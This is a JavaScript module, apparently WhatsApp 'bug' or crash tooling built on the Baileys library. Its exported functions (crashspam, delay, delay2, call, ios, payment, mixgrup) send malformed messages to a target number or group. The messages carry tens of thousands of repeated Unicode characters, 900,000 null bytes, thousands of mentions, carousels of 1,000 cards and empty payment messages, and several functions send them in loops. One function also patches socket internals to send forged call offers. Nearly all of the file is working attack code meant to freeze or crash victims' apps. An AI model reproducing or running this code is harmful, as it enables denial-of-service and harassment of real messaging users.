const crypto = require('crypto');
const { generateWAMessageFromContent, encodeWAMessage, jidDecode, encodeSignedDeviceIdentity } = require('baileys');
const chalk = require('chalk');
   
async function call(sock, X) {
    try {
    let devices = (
        await sock.getUSyncDevices([X], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let createMutex = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let mutexManager = createMutex();
    let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let originalCreateParticipantNodes = sock.createParticipantNodes.bind(sock);
    let encodeMsg = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let mapped = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
            let { user: targetUser } = jidDecode(jid);
            let { user: ownPnUser } = jidDecode(meId);
            let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
            let isSelf = jid === meId || jid === meLid;

            if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

            let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));

            return mutexManager.mutex(jid, async () => {
                let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
                if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                return {
                    tag: 'to',
                    attrs: { jid },
                    content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                };
            });
        }));

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let { nodes: destinations, shouldIncludeDeviceIdentity } =
        await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let callNode = {
        tag: "call",
        attrs: { to: X, id: sock.generateMessageTag(), from: sock.user.id },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : [])
            ]
        }]
    };

    await sock.sendNode(callNode);
    await sock.sendNode(callNode);
    
         } catch (err) {
            console.error(err);
         }
         
        };


async function ios(sock, X, ptcp = true) {
    const extendedTextMessage = {
        text: "𝐒͢𝐢͡༑𝐗 ⍣᳟ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 🐉 \n\n 🫀 creditos : t.me/whiletry" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://t.me/RennXiter",
        description: "RennXiter" + "𑇂𑆵𑆴𑆿".repeat(15000),
        title: "𝐒͢𝐢͡༑𝐗 ᭯ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ☇ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗፝𝐨〽️" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
        }
    };

    const msg = generateWAMessageFromContent(
        X,
        { viewOnceMessage: { message: { extendedTextMessage } } },
        {}
    );

    await sock.relayMessage(X, {
        groupStatusMessageV2: {
            message: msg.message
        }
    }, ptcp ? { messageId: msg.key.id, participant: { jid: X } } : { messageId: msg.key.id });
}

async function delay(sock, X, ptcp = true) {
   
        let msg = generateWAMessageFromContent(X, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                },
                body: {
                    text: "𖣂᳟༑ᜌ ̬     ͠⤻𝐌𝐀𝐒𝐓𝐄𝐑 ( 𖣂 ) 𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑  ⃜    ᭨᳟᪳",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                    version: 3
                }
            }
        }, {});

        await sock.relayMessage(X, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, ptcp ? { messageId: msg.key.id, participant: { jid: X } } : { messageId: msg.key.id });
    }
    
async function GcSlx(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
                botInvokeMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: require('crypto').randomBytes(32),
                            messageAssociation: {
                                associationType: 7,
                                parentMessageKey: require('crypto').randomBytes(16)
                            }
                        },
                        pollCreationMessage: { 
                            name: "\u0000".repeat(1000),
                            options: [
                                { optionName: "\u0000" },
                                { optionName: "\u0000" },
                                { optionName: "\u0000" }
                            ],
                            selectableOptionsCount: 1,
                            pollType: "QUIZ",
                            correctAnswer: { optionName: "\u0000" }
                        }
                    }
                }
            },
            { messageId: null }
        );
        
        
        await new Promise(r => setTimeout(r, 1000));

        await sock.relayMessage(
            target,
            {
                ephemeralMessage: {
                    message: Array.from({ length: 800 }).reduce(
                        y => ({
                            requestPaymentMessage: {}
                        }),
                        {}
                    )
                }
            },
            { messageId: null }
        );

        console.log("[SUCCESS] GcSlx payloads sent to:", target);

    } catch (err) {
        console.error("[ERROR] GcSlx:", err);
    }
}

async function payment(sock, target) {
const payload = {
sendPaymentMessage: {}
};

await sock.relayMessage(target, payload, {  
    participant: { jid: target },  
    messageId: null,  
    userJid: target,  
    quoted: null  
});  

console.log(chalk.red("Successfully sent one message"));

}

async function delayGroup(sock, target) {
    try {
        await sock.relayMessage(
    target,
    {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                    },
                    body: {
                        text: "𖣂᳟༑ᜌ ‌     ‌⤻𝐌𝐀𝐒𝐓𝐄𝐑 ( 𖣂 ) 𝐒‌‌𝐔‌𝐏𝐄ʺ‌𝐑𝐈‌𝐎‌𝐑  ⃜    ᭨᳟᪳",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                        version: 3
                    }
                }
            }
        }
    },
    { messageId: null }
)
    } catch (err) {
        console.error(err);
    }
}

async function GcIos(sock, X) {
    try {
        await sock.relayMessage(
            X,
            {
                groupStatusMessageV2: {
                    message: {
                        viewOnceMessage: {
                            message: {
                                locationMessage: {
                                    degreesLatitude: -9.09999262999,
                                    degreesLongitude: 199.99963118999,
                                    jpegThumbnail: null,
                                    name: "RennXiter" + "𑇂𑆵𑆴𑆿".repeat(15000),
                                    address: "RennXiter" + "𑇂𑆵𑆴𑆿".repeat(5000),
                                    url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`
                                }
                            }
                        }
                    }
                }
            },
            { messageId: null }
        );


        await sock.relayMessage(
            X,
            {
                groupStatusMessageV2: {
                    message: {
                        viewOnceMessage: {
                            message: {
                                extendedTextMessage: {
                                    text: "𝐒͢𝐢͡༑𝐗 ⍣᳟ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 🐉 \n\n 🫀 creditos : t.me/whiletry" + "𑇂𑆵𑆴𑆿".repeat(15000),
                                    matchedText: "https://t.me/RennXiter",
                                    description: "RennXiter" + "𑇂𑆵𑆴𑆿".repeat(15000),
                                    title: "𝐒͢𝐢͡༑𝐗 ᭯ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ☇ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗፝𝐨〽️" + "𑇂𑆵𑆴𑆿".repeat(15000),
                                    previewType: "NONE",
                                    jpegThumbnail: null,
                                    placeholderKey: {
                                        remoteJid: "0@s.whatsapp.net",
                                        fromMe: false,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        }
                    }
                }
            },
            { messageId: null }
        );

        console.log("[SUCCESS] Both payloads sent to:", X);
        
    } catch (err) {
        console.error("[ERROR] InVsSwIphone_iNvsExTendIos:", err);
    }
}

async function mixgrup(sock, target) {
await GcSlx(sock, target);
for (let i = 0; i < 20; i++) {
await GcIos(sock, target);
}
}

/* function bugs sementara */
async function PayNull(sock, X) {    
    const msg = generateWAMessageFromContent(X, {
        requestPaymentMessage: {}
    }, {});

    for(let i = 0; i < 20; i++) {
        await sock.relayMessage(X, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { 
            messageId: null 
        });
        console.log(chalk.blue(`[ ! ] Execution Payment Null`));
        if (i < 99) await new Promise(resolve => setTimeout(resolve, 50));
    }
}

async function crashspam(sock, X) {    
    const msg = generateWAMessageFromContent(X, {
        extendedTextMessage: {
            text: "📃 null - 𝖳𝗒𝗉𝖾 𝗈𝖿 𝖽𝖾𝖼𝗈𝗋𝖺𝗍𝗂𝗈𝗇!.",
            matchedText: "https://t.me/dexoffc",
            description: "X",
            title: " # - 𝖽𝖾𝖼𝗈𝗋𝖺𝗍𝗂𝗈𝗇!.",
            paymentLinkMetadata: {
                button: { displayText: "X" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(5000) }
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "X" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(5000) }
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221
            }
        }
    }, {
        additionalAttributes: { edit: "7" }
    });

    const ms = 4; 
    const sm = 1000;
  

    for(let i = 0; i < sm; i++) {
        try {
            await sock.relayMessage(X, {
                groupStatusMessageV2: {
                    message: msg.message
                }
            }, { 
                messageId: null 
            });
            
            console.log(chalk.green(`[ # ] Sent to ${X}`));
            if (i < total - 1) {
                
                await new Promise(resolve => setTimeout(resolve, ms * 1000));
            }
            
        } catch (error) {
            
            if (i < total - 1) {
                await new Promise(resolve => setTimeout(resolve, ms * 1000));
            }
        }
    }
    
    console.log(chalk.green.bold(`[ 🚩 ] COMPLETED: ${total} messages sent with ${ms}s delay`));
}


async function delay2(sock, X) {    
   const totalPushes = 10;
   for (let i = 0; i < totalPushes; i++) {
      const push = [];
      const buttons = [];
      for (let j = 0; j < 5; j++) {
         buttons.push({
            name: 'galaxy_message',
            buttonParamsJson: JSON.stringify({
               header: 'null',
               body: 'xxx',
               flow_action: 'navigate',
               flow_action_payload: {
                  screen: 'FORM_SCREEN'
               },
               flow_cta: 'Grattler',
               flow_id: '1169834181134583',
               flow_message_version: '3',
               flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
            }),
         });
      }
      for (let k = 0; k < 1000; k++) {
         push.push({
            body: {
               text: 'Overload WhatsApp'
            },
            footer: {
               text: ''
            },
            header: {
               title: '🚩 TrashSuperior ',
               hasMediaAttachment: true,
               imageMessage: {
                  url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
                  mimetype: 'image/jpeg',
                  fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
                  fileLength: '591',
                  height: 0,
                  width: 0,
                  mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
                  fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
                  directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
                  mediaKeyTimestamp: '1721344123',
                  jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z',
                  scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                  scanLengths: [247, 201, 73, 63],
                  midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=',
               },
            },
            nativeFlowMessage: {
               buttons: [],
            },
         });
      }
      const carousel = generateWAMessageFromContent(X, {
         interactiveMessage: {
            header: {
               hasMediaAttachment: false,
            },
            body: {
               text: '\u0000\u0000\u0000\u0000',
            },
            footer: {
               text: 'Trash Superior',
            },
            carouselMessage: {
               cards: [...push],
            },
         }
      }, {
         userJid: X
      });
      await sock.relayMessage(X, { groupStatusMessageV2: { message: carousel.message } }, {
         messageId: carousel.key.id,
         participant: {
            jid: X
         },
      });
   }
};

module.exports = {
   crashspam,
   delay2,
   delay,
   call,
   ios,
   payment,
   mixgrup
};
